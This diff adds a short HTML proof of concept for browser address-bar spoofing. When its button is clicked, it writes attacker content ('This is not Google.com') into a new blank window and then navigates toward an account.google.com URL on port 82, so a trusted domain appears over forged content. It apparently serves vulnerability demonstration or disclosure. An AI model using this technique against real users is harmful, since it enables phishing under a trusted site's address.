@@ -1,0 +1,18 @@
+<button style="font-size: 50px;" onclick="spoof()">halo</button>
+
+<script>
+    function spoof(){
+       const w = window.open("about:blank")
+
+        w.document.write(`
+        
+        <h1>Address bar spoofed This is not Google.com :)</h1>
+
+        <script>
+            location.href = "https://account.google.com:82";
+        </\script>
+
+        
+        `)
+    }
+</script>
